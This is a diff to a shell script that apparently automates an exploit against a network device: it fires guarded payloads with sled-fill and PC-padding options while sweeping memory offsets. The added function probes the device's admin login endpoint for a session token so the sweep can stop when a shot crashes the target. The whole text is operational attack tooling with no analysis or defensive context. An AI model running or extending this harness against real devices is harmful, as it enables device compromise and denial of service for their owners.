@@ -103,6 +103,18 @@ sleep "$GUARD_GAP"
 # state before the shot: a crash mid-fire must not produce a second payload
 echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 
+ds_ready() { # 1 when the DS answers a login — a crashed shot can leave it dead
+  local _t out
+  for _t in 1 2 3; do
+    out=$(curl -s --connect-timeout 3 -m 5 \
+      -d '{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}' \
+      "http://$ip/" 2>/dev/null | head -1)
+    echo "$out" | grep -q stok && return 0
+    sleep 2
+  done
+  return 1
+}
+
 shot() { # shot <offset> — one guarded fire at the current addr
   "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$1" \
         --count 1 --sledfill --padpc 1 --pcround 0x1000 \
@@ -144,6 +156,10 @@ while [ "$i" -lt "$OFF_N" ]; do
   off=$((off + OFF_STEP)); i=$((i + 1))
   sleep "$GUARD_GAP"
   now_ip="$(resolve_ip)"; [ -n "$now_ip" ] && ip="$now_ip"
+  if ! ds_ready; then
+    log "DS died during the sweep at offset $off — leaving the rest for the next wake"
+    break
+  fi
   log "offset sweep $i/$OFF_N -> $off"
   out="$(shot "$off")"
   printf '%s\n' "$out" >> "$LOG"
